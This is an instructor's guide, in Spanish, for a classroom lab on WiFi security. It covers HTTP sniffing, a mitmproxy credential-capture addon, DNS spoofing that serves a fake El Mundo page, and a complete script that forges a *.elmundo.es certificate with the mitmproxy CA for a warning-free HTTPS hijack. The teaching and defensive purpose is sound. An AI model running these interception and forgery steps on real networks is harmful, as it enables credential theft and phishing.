# Guion del Instructor — Enterprise WiFi Security Lab

---

## Checklist técnico previo a clase

Ejecutar antes de que lleguen los alumnos:

```bash
cd ~/wifi-lab-public

# Primera vez o tras reinstalación del Pi:
sudo ./enterprise_lab.sh
sudo ./setup_webserver.sh

# Estado inicial: MITM desactivado, webserver y nginx parados
sudo ./mitm-control.sh disable
sudo ./dns-spoof.sh disable

# Verificación completa
sudo ./lab_precheck.sh
```

Verificar manualmente:

- [ ] SSID `CorpNet-Enterprise` visible desde un móvil
- [ ] Un dispositivo conectado recibe IP en rango `192.168.50.x`
- [ ] `http://neverssl.com` carga sin aviso (MITM inactivo)
- [ ] `https://example.com` carga sin aviso de certificado (MITM inactivo)
- [ ] `sudo ./mitm-control.sh status` muestra interception OFF, webserver OFF
- [ ] `sudo ./dns-spoof.sh status` muestra DNS spoof OFF
- [ ] `sudo ./lab_precheck.sh` termina con 0 failures

---

## Flujo de la sesión — visión general

```text
Inicio de clase   → MITM OFF, webserver OFF, nginx OFF  (estado base)
Bloque 1          → Conexión libre, sniffing HTTP, metadatos HTTPS
Bloque 2          → mitm-control.sh enable   (aviso de certificado, detección de proxy)
Bloque 3          → dns-spoof.sh enable      (DNS spoof, Google falso)
Bloque 4 (opt.)  → mitm-control.sh webserver on  (HTTP vs HTTPS, lab_webserver)
Fin de clase      → mitm-control.sh disable && dns-spoof.sh disable
```

---

## Referencia rápida de comandos

### Control del proxy MITM

```bash
sudo ./mitm-control.sh status           # estado general
sudo ./mitm-control.sh enable           # activa interceptación (iptables + mitmproxy)
sudo ./mitm-control.sh disable          # desactiva interceptación
sudo ./mitm-control.sh modify  on|off   # addon: modificación de contenido (Gooogle/B1ng)
sudo ./mitm-control.sh creds   on|off   # addon: captura de credenciales
sudo ./mitm-control.sh webserver on|off # lab_webserver en puerto 80 (para el bloque 4)
```

### Control del DNS spoofing

```bash
sudo ./dns-spoof.sh status   # estado del ejercicio
sudo ./dns-spoof.sh enable   # activa: para lab_webserver, lanza nginx, inyecta DNS
sudo ./dns-spoof.sh disable  # desactiva: para nginx, elimina inyección DNS
```

### Monitorización en tiempo real

```bash
# Tráfico HTTP en claro (sniffing)
sudo tcpdump -i wlan0 -A -s 0 'tcp port 80' 2>/dev/null \
  | grep -E --line-buffered "Host:|GET |POST |Cookie:|Authorization:"

# Dominios HTTPS visitados (solo metadatos, contenido cifrado)
sudo tcpdump -i wlan0 -l 'tcp port 443' 2>/dev/null \
  | strings | grep -oE '[a-z0-9-]+\.[a-z0-9.-]+\.[a-z]{2,}' | sort -u

# Log de mitmproxy
sudo journalctl -u enterprise.service -f --no-pager

# Solo credenciales capturadas
sudo journalctl -u enterprise.service -f --no-pager | grep -A3 "\[CRED\]"

# Clientes conectados al AP
watch -n2 cat /var/lib/misc/dnsmasq.leases
```

---

## Guion por bloques

---

### BLOQUE 1 — Conexión libre y sniffing HTTP (0–25 min)

**Estado del lab:** MITM OFF · webserver OFF · nginx OFF

**Objetivo:** Que el alumno entienda qué puede ver el operador de la red *sin ningún proxy*, solo con acceso al AP. Punto de partida: WiFi aparentemente normal.

#### Parte A — Contexto y modelo de amenaza (0–10 min)

**Arranque (pregunta al grupo):**
> "¿Cuántos de vosotros os habéis conectado a una WiFi de hotel, aeropuerto o cafetería en el último mes? ¿Comprobasteis alguna vez quién la operaba?"

La WiFi pública tiene tres actores:

1. **Tú** (el cliente)
2. **El AP y el operador** (quien controla la infraestructura)
3. **Otros usuarios de la misma red** (en WiFi abierta o WPA-PSK compartida)

**Diferencia WiFi abierta vs WPA:**
> "WPA cifra el canal de radio. Piensa en ello como un tubo entre tu dispositivo y la puerta del edificio. Lo que hay más allá del AP ya no está en ese tubo. Además, en WPA-Personal todos los usuarios comparten la misma clave, lo que permite descifrar capturas de radio ajenas si la conoces."

**Punto de anclaje:**
> "En ningún caso WPA protege del operador de la red. Es el operador quien configura el AP."
>
> "Os voy a pedir que os conectéis a `CorpNet-Enterprise`. Lo que veáis en el navegador, yo lo veo también — y ahora mismo no tengo ningún proxy activo. Vamos a ver qué se puede observar desde el AP sin interceptar nada."

#### Parte B — Sniffing HTTP en vivo (10–25 min)

**En el terminal del instructor, antes de pedir a los alumnos que naveguen:**

```bash
sudo tcpdump -i wlan0 -A -s 0 'tcp port 80' 2>/dev/null \
  | grep -E --line-buffered "Host:|GET |POST |Cookie:|Authorization:"
```

**Instrucción a alumnos:**
> "Conectaos a `CorpNet-Enterprise`. Abrid el navegador y visitad `http://neverssl.com`."

**Proyectar la salida de tcpdump en tiempo real.** Los alumnos verán sus propias peticiones aparecer en pantalla:

```text
Host: neverssl.com
GET / HTTP/1.1
```

**Preguntas retóricas:**

- ¿Qué pasaría si ese sitio fuera el portal de vuestra empresa con login en HTTP?
- ¿Veis el header `Cookie:`? Eso puede equivaler a una sesión activa robable.

**Metadatos HTTPS — sin proxy, solo con el AP:**

```bash
sudo tcpdump -i wlan0 -l 'tcp port 443' 2>/dev/null \
  | strings | grep -oE '[a-z0-9-]+\.[a-z0-9.-]+\.[a-z]{2,}' | sort -u
```

> "Ahora visitad cualquier web HTTPS. El contenido viaja cifrado — pero yo veo a qué dominios os conectáis, cuándo y con qué frecuencia."

**Mensaje clave:**
> "HTTPS oculta el cuerpo. El SNI del ClientHello viaja sin cifrar → el operador sabe exactamente a qué dominio te conectas, incluso sin proxy."

---

### BLOQUE 2 — Activar MITM: aviso de certificado y detección (25–50 min)

**Transición:** El instructor activa el proxy de interceptación.

```bash
sudo ./mitm-control.sh enable
```

> "Acabo de activar algo en la red. Seguid navegando con normalidad."

#### Parte A — El aviso del navegador (25–35 min)

> "Ahora visitad `https://example.com` desde el navegador."

Los alumnos verán:

- Chrome/Edge: "Tu conexión no es privada" — `NET::ERR_CERT_AUTHORITY_INVALID`
- Firefox: "Advertencia: riesgo de seguridad potencial"
- Safari: "Esta conexión no es privada"

> "Haced clic en `Detalles` o `Ver certificado`. Buscad el campo `Emitido por`."

Proyectar el log de mitmproxy:

```bash
sudo journalctl -u enterprise.service -f --no-pager
```

Verán:

```text
client connect  192.168.50.102:52935
server connect  93.184.216.34:443
Client TLS handshake failed. The client does not trust the proxy's certificate for example.com
```

**Punto de discusión:**
> "El proxy estaba ahí. Intentó interceptar. El navegador lo detectó porque la CA no era de confianza. ¿Qué hubiera pasado si hacéis clic en 'Continuar de todos modos'?"

#### Parte B — Detectar el proxy desde el dispositivo (35–42 min)

**B.1 — Desde el navegador (método gráfico, para todos)**

Con `https://example.com` ya abierto (tras aceptar el aviso):

1. Click en el **candado** (o triángulo rojo) de la barra de URL.
2. *"Conexión no segura"* → *"Detalles del certificado"*.
3. Mirar el campo **Emitido por** → aparecerá: `mitmproxy`.

En Chrome también: **F12 → pestaña Security** muestra la cadena de certs visualmente con un botón *View certificate*.

**Demostración HSTS preload (el momento dramático del bloque):**

Pedir que naveguen a un sitio HSTS-preloaded:

- `https://github.com`
- `https://google.com`
- `https://facebook.com`

El navegador **REFUSES** conectar. *No aparece el botón "Continuar de todos modos"*.

> "Mirad la diferencia. En `example.com` el navegador os dejó decidir. En `github.com` ni siquiera os da la opción. Esos dominios están en la lista **HSTS preload** del navegador — hardcoded en el código del navegador como 'siempre TLS válido, sin excepciones'. Es la única defensa real contra un MITM con CA instalada: el cliente decide *a priori* que no acepta excepciones para ciertos dominios."

**Opcional — comparar con badssl.com:**

`https://untrusted-root.badssl.com` enseña exactamente el mismo tipo de aviso que produce mitmproxy. Útil para mostrar que el patrón del warning no es exclusivo del lab.

**B.2 — Desde la terminal (método técnico, complementario)**

```bash
# En el dispositivo del alumno (Linux/macOS):
openssl s_client -connect example.com:443 -servername example.com 2>/dev/null \
  | openssl x509 -noout -issuer

# Con proxy activo:
# issuer=O=mitmproxy, CN=mitmproxy

# En red limpia:
# issuer=C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1
```

> "En una red corporativa con inspección legítima veréis `Zscaler Root CA`, `Cisco Umbrella` o `BlueCoat ProxySG`. Eso indica que alguien en la red puede leer vuestro tráfico HTTPS."

#### Parte C — Aplicaciones vs navegador (42–47 min)

> "Intentad abrir Instagram, WhatsApp o la app de vuestro banco. ¿Funciona?"

Respuesta esperada:

- Apps con **certificate pinning** (Facebook, Instagram, WhatsApp, banca): fallan silenciosamente, sin aviso.
- Navegador: muestra aviso, deja al usuario decidir.

> "Las apps con pinning tienen el certificado esperado hardcodeado. No confían en el almacén del sistema. Por eso no muestran aviso: simplemente no se conectan."

#### Parte D — Credential harvesting (47–50 min, opcional)

```bash
sudo ./mitm-control.sh creds on
```

Pedir a los alumnos que visiten `http://testasp.vulnweb.com` y envíen el formulario de login con cualquier usuario y contraseña.

```bash
sudo journalctl -u enterprise.service -f --no-pager | grep -A3 "\[CRED\]"
```

Verán:

```text
[CRED] POST to http://testasp.vulnweb.com/Login.asp
[CRED] Source IP : 192.168.50.150
[CRED] Fields    : {'tfUName': ['alice'], 'tfUPass': ['secret123']}
```

> "Sin descifrar nada. HTTP entrega las credenciales en texto plano. Es la razón por la que HTTP nunca debe usarse para autenticación."

##### Sidebar — "Probé con Facebook/Instagram y no veo las contraseñas"

Si algún alumno (o tú, en una prueba previa) intenta capturar credenciales en Facebook o Instagram, encontrará dos comportamientos distintos que son **un punto didáctico potente**:

**Facebook** — el proxy lo deja pasar sin tocar. El script `start_proxy.sh` incluye `--ignore-hosts` con `.+\.facebook\.com` y `.+\.fbcdn\.net`. Razón práctica: si interceptas Facebook, las apps móviles abiertas en cualquier teléfono cercano (con certificate pinning) empiezan a fallar y el lab pierde control. El proxy hace pass-through TCP sin TLS interception → no hay POST descifrado → no hay `[CRED]`.

**Instagram** — *SÍ* está siendo interceptado (no figura en `--ignore-hosts`). En el log de mitmproxy aparece el POST decifrado:

```text
[CRED] POST to https://www.instagram.com/api/graphql
[CRED] Fields    : {'__user': ['0'], 'fb_api_req_friendly_name': ['useCDSWebLoginMutation']}
```

Pero el password **no está en claro** en los Fields. Está en el body como:

```text
enc_password=#PWD_INSTAGRAM_BROWSER:1:1715769432:AbCdEf...base64...==
```

**Eso es `client-side password encryption`.** Meta (y Google, y la banca seria) cifra el password en JavaScript ANTES de enviarlo, usando una clave pública del servidor. Aunque rompas TLS con mitmproxy, te encontrás con un sobre dentro del sobre.

**Frase para clase:**

> "Pensaban que con la CA instalada todo HTTPS era texto plano para el operador, ¿no? Miren: la POST de login pasó por nuestro proxy. Lo descifró. Pero el password seguía cifrado por una SEGUNDA capa con una clave pública del servidor. Esto se llama envelope encryption. Lo hacen Meta, Google y todos los bancos serios. La lección: TLS NO es la única defensa. Los servicios críticos ASUMEN que el TLS puede romperse — porque puede romperse, como acabamos de demostrar — y agregan capas encima. Defense-in-depth no es un buzzword: es lo que está pasando ahora mismo en cada login que hacen al día."

Por eso el demo "oficial" usa `http://testasp.vulnweb.com`: HTTP plano, formulario clásico, sin TLS, sin client-side crypto. Es el contraste perfecto para mostrar primero "así de fácil sin protección" y después, opcionalmente, "y así de bien lo hace una empresa que se toma esto en serio".

```bash
sudo ./mitm-control.sh creds off
```

---

### BLOQUE 3 — DNS Spoofing: el Google falso (50–65 min)

**Objetivo:** Demostrar que el operador del AP controla el DNS y puede redirigir cualquier dominio a una página local, sin que el cliente cambie de red ni note nada extraño en la URL.

**El instructor activa el ejercicio:**

```bash
sudo ./dns-spoof.sh enable
```

Esto para `lab_webserver` si estuviera activo, lanza nginx con la página falsa de El Mundo y añade la entrada de spoof en dnsmasq.

> "Ahora abrid una ventana de incógnito y entrad a elmundo.es desde el navegador."

**¿Por qué incógnito?** Los navegadores cachean redirecciones HTTP→HTTPS de sesiones anteriores. La ventana de incógnito parte de un estado limpio y evita ese problema.

#### Resolver el problema de caché DNS

Los clientes que ya hayan resuelto `elmundo.es` durante la sesión tienen la IP real en caché. Para que vean la página falsa, necesitan resolver de nuevo:

**Opción más sencilla (todos los sistemas):**
> "Desconectad el WiFi y volved a conectaros a `CorpNet-Enterprise`."

**Alternativas por sistema operativo:**

| Sistema | Comando |
| --------- | ------- |
| Windows | `ipconfig /flushdns` (cmd como administrador) |
| macOS | `sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder` |
| Linux | `resolvectl flush-caches` o `sudo systemd-resolve --flush-caches` |
| iOS / Android | Activar y desactivar el modo avión |

**Verificar desde el Pi que los clientes resuelven correctamente:**

```bash
# Comprobar qué IP devuelve dnsmasq para elmundo.es desde el Pi
dig @192.168.50.1 elmundo.es +short
# Debe devolver: 192.168.50.1
```

#### La demo

Cuando los alumnos abran `elmundo.es` en incógnito verán:

- La página con el aspecto de El Mundo (logo, secciones, noticias)
- Un **banner rojo** en la parte superior: *"DEMO — DNS SPOOFING ACTIVO"*
- Al hacer clic en cualquier noticia, un modal muestra la URL interceptada

> "¿Qué veis en la barra de URL? `elmundo.es`. Sin embargo, nunca habéis salido de esta red. El operador del AP controla lo que veis."

**Discusión:**

- ¿Qué información se podría capturar si la página falsa tuviera un formulario de login?
- ¿Cómo detectaríais que no estáis en el El Mundo real? (IP de destino, DNS autoritativo)
- ¿Por qué no funciona este ataque con `google.com`? (HSTS preloading: el navegador fuerza HTTPS de forma incondicional)

#### Extensión avanzada (opcional) — HTTPS hijack completo con cert firmado por mitm CA

Hasta acá el demo funciona para HTTP. Si el alumno intenta `https://www.elmundo.es`, el browser muestra un cert warning — incluso **si tiene instalada la CA de mitmproxy del Bloque 2**. Es un punto pedagógico clave: muchos asumen "tengo la CA, todo HTTPS pasa transparente". No funciona así.

**Por qué falla HTTPS con DNS spoof solo:**

Por defecto nginx presenta un cert auto-firmado (`/etc/nginx/ssl/spoof.crt`):

```text
issuer=CN=192.168.50.1, O=Lab, C=ES    ← NO firmado por mitmproxy CA
subject=CN=192.168.50.1                ← Hostname mismatch con www.elmundo.es
```

Dos razones para rechazar:
1. **Trust chain rota**: la CA de mitmproxy en el browser no firmó este cert.
2. **Hostname mismatch**: aunque la CA fuera correcta, el CN es `192.168.50.1`, no `www.elmundo.es`.

> "Instalar una CA en el browser solo sirve si los certs que recibís están FIRMADOS por esa CA. La CA no es una llave universal — es una entidad firmante. Si el server presenta un cert firmado por OTRA CA o self-signed, instalar la mitmproxy CA no cambia nada."

**Cómo lograr el hijack HTTPS transparente (sin warning):**

Generar un cert para `*.elmundo.es` firmado por la CA de mitmproxy, y configurarlo en nginx para que se sirva cuando el SNI coincida con elmundo.es. Como Firefox/Chrome ya confían en mitmproxy CA (del Bloque 2), no habrá warning.

```bash
sudo bash <<'CERT'
SSL_DIR="/etc/nginx/ssl"
CA="/root/.mitmproxy/mitmproxy-ca.pem"

cat > /tmp/elmundo.cnf <<'CFG'
[req]
distinguished_name=dn
req_extensions=ext
prompt=no
[dn]
CN=*.elmundo.es
O=Lab MITM
C=ES
[ext]
subjectAltName=@alt
keyUsage=digitalSignature,keyEncipherment
extendedKeyUsage=serverAuth
[alt]
DNS.1=elmundo.es
DNS.2=*.elmundo.es
CFG

openssl genrsa -out ${SSL_DIR}/elmundo-mitm.key 2048
openssl req -new -key ${SSL_DIR}/elmundo-mitm.key -out /tmp/elmundo.csr -config /tmp/elmundo.cnf
openssl x509 -req -in /tmp/elmundo.csr \
  -CA ${CA} -CAkey ${CA} -CAcreateserial \
  -out ${SSL_DIR}/elmundo-mitm.crt \
  -days 365 -sha256 \
  -extensions ext -extfile /tmp/elmundo.cnf
chmod 600 ${SSL_DIR}/elmundo-mitm.key

# Append new server block AFTER the default 443 — matched via server_name (SNI)
cat >> /etc/nginx/sites-available/fake-elmundo <<'NGX'

# === HTTPS hijack: cert signed by mitmproxy CA for elmundo.es ===
server {
    listen 443 ssl;
    server_name elmundo.es www.elmundo.es *.elmundo.es;
    ssl_certificate     /etc/nginx/ssl/elmundo-mitm.crt;
    ssl_certificate_key /etc/nginx/ssl/elmundo-mitm.key;
    root /var/www/fake-elmundo;
    index index.html;
    location / { try_files $uri $uri/ /index.html; }
}
NGX

nginx -t && systemctl reload nginx
CERT
```

**Verificación rápida desde el Pi:**

```bash
openssl s_client -connect 192.168.50.1:443 -servername www.elmundo.es </dev/null 2>/dev/null \
  | openssl x509 -noout -issuer -subject
# Debe mostrar:
# issuer=CN=mitmproxy, O=mitmproxy
# subject=CN=*.elmundo.es, O=Lab MITM, C=ES
```

**El demo final desde el laptop:**

> "Ahora vuestro browser, que confía en la CA de mitmproxy desde el Bloque 2, va a aceptar SIN AVISO el cert que presento para elmundo.es. Mirad."

Alumno navega a `https://www.elmundo.es` en ventana privada de Firefox (con la CA instalada):

- Página falsa de El Mundo cargando vía HTTPS ✓
- Candado verde ✓
- Sin warning ✓
- URL en la barra: `https://www.elmundo.es` ✓

**Punto pedagógico (cierre del bloque):**

> "Lo que acaban de ver es el endgame del operador hostil de red. DNS spoof + cert firmado por una CA que tu sistema confía = hijack TOTAL e INVISIBLE. Sin warnings, sin candado roto, sin nada que les sugiera que están mirando una página falsa."
>
> "¿Cuál es la defensa? Tres capas, en orden de fuerza:"
> 1. **HSTS preload** — el navegador hardcodea ciertos dominios como 'siempre TLS válido'. Esos dominios fallan SIN excepción posible. Ya lo vimos en el Bloque 2 con github.com.
> 2. **Certificate pinning** (apps móviles) — la app sabe exactamente qué cert esperar, ignora completamente el almacén del sistema. Por eso WhatsApp/banca/Instagram en móvil son inmunes.
> 3. **Certificate Transparency** — todos los certs emitidos por CAs públicas se publican en logs auditables. Una CA legítima firmando `elmundo.es` para alguien que no es Unidad Editorial sería detectada y revocada — pero la CA de mitmproxy es PRIVADA (no está en CT), entonces para este ataque no aplica. Es defensa contra CAs comprometidas, no contra atacantes que controlan tu trust store.
>
> "Conclusión brutal: SI alguien convence a tu sistema de confiar en su CA — vía MDM corporativo, malware, o tú haciendo click sin pensar — tu HTTPS no vale nada para los dominios que no tengan HSTS preload o pinning."

**Limpieza al terminar la extensión:**

```bash
# Eliminar el server block agregado y los certs generados
sudo sed -i '/=== HTTPS hijack:/,$d' /etc/nginx/sites-available/fake-elmundo 2>/dev/null || true
# (alternativa más segura: editar el archivo a mano y borrar el server block añadido)
sudo rm -f /etc/nginx/ssl/elmundo-mitm.crt /etc/nginx/ssl/elmundo-mitm.key
sudo nginx -t && sudo systemctl reload nginx
```

**Al terminar:**

```bash
sudo ./dns-spoof.sh disable
```

---

### BLOQUE 4 — Lab Webserver: HTTP vs HTTPS (65–80 min) [opcional]

**Objetivo:** Visualizar lado a lado qué ve el operador en HTTP y qué ve en HTTPS, con un formulario real enviado por los alumnos.

**Lanzar el servidor:**

```bash
sudo ./mitm-control.sh webserver on
```

Esto para nginx si estuviera activo e inicia `lab_webserver` en el puerto 80 (y 443).

Abrir en el terminal del instructor la vista en tiempo real del log:

```bash
sudo tail -f /var/log/lab_webserver.log | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        e = json.loads(line)
        print(f\"[{e['ts']}] {e['proto']:5}  {e['ip']:<16} {e['user']:<20} {e['message']}\")
    except: pass
"
```

#### Paso 1 — Formulario HTTP

Pedir a los alumnos que abran:

```text
http://192.168.50.1/send
```

Señalar el **banner rojo**: *"HTTP — tu mensaje viaja en TEXTO CLARO"*.

> "Escribid un usuario y un mensaje. Podéis poner vuestra contraseña habitual si queréis que se vea en la demo."

Proyectar tcpdump mientras envían el formulario:

```bash
sudo tcpdump -i wlan0 -A -s 0 'tcp port 80 and dst host 192.168.50.1' 2>/dev/null \
  | grep -E --line-buffered "user=|message=|POST"
```

Verán:

```text
POST /send HTTP/1.1
user=alice&message=micontrasena123
```

> "No he instalado nada especial. Solo `tcpdump`. Cualquier operador de red ve exactamente esto."

#### Paso 2 — Formulario HTTPS

```text
https://192.168.50.1/send
```

El navegador mostrará aviso de certificado autofirmado — aceptar la excepción.

Señalar el **banner verde**: *"HTTPS — tu mensaje viaja CIFRADO"*.

Proyectar tcpdump:

```bash
sudo tcpdump -i wlan0 -A -s 0 'tcp port 443 and dst host 192.168.50.1' 2>/dev/null \
  | grep -v "^[0-9]" | head -20
```

Verán ruido cifrado, sin ningún campo legible.

#### Paso 3 — Tabla comparativa

```text
http://192.168.50.1/visualize
```

Los alumnos ven sus propias entradas en la tabla, con la columna **Proto** en rojo (HTTP) o verde (HTTPS).

> "Ambos mensajes llegaron al servidor. Solo los de HTTP los intercepté en tránsito."

**Comandos útiles:**

```bash
# Borrar el log entre demos
sudo truncate -s 0 /var/log/lab_webserver.log

# Estado del servicio
systemctl status lab-webserver
```

**Al terminar:**

```bash
sudo ./mitm-control.sh webserver off
```

---

### BLOQUE 5 — Análisis de captura PCAP (80–87 min)

```bash
sudo IFACE=wlan0 DURATION_SEC=120 LOG_DIR=/tmp/lab_cap ./soc_monitor.sh
ls -lh /tmp/lab_cap/
```

Si hay Wireshark disponible, abrir el `.pcap` y mostrar:

- Filtro `http` → peticiones en claro
- Filtro `tls.handshake.extensions_server_name` → todos los dominios visitados
- Filtro `dns` → resoluciones (incluyendo la de google.com resuelta a 192.168.50.1)

> "Incluso sin descifrar TLS, con el SNI y los patrones de tiempo y volumen un analista puede construir un perfil completo de actividad."

---

### BLOQUE 6 — Debate y cierre (87–90 min)

**Preguntas para debate abierto:**

1. *¿Tiene una empresa derecho a inspeccionar el tráfico TLS de sus empleados en la red corporativa?*
   - Respuesta legal: depende del país y de si hay política de uso firmada.
   - En muchos países: sí, si está documentado y el empleado ha sido informado.

2. *Soy empleado y uso un dispositivo personal en la red corporativa con inspección TLS. ¿Qué riesgos asumo?*
   - La empresa puede ver todo el tráfico del dispositivo.
   - Solución: datos móviles para tráfico personal, VPN propia en modo split tunnel.

3. *Un aeropuerto me pide instalar un certificado para acceder a su WiFi. ¿Lo hago?*
   - No. Nunca. Usa datos móviles en su lugar.

4. *¿Qué diferencia hay entre un proxy corporativo TLS y tu ISP viendo tu tráfico?*
   - El proxy TLS ve el contenido cifrado también. El ISP solo ve metadatos si usas HTTPS.

**Mensaje de cierre:**
> "La seguridad no es un estado binario. Es un conjunto de decisiones informadas. Hoy habéis aprendido a no delegar esas decisiones al candado del navegador."

---

## Apagado al finalizar la clase

```bash
sudo ./mitm-control.sh disable
sudo ./dns-spoof.sh disable
sudo ./mitm-control.sh webserver off
```
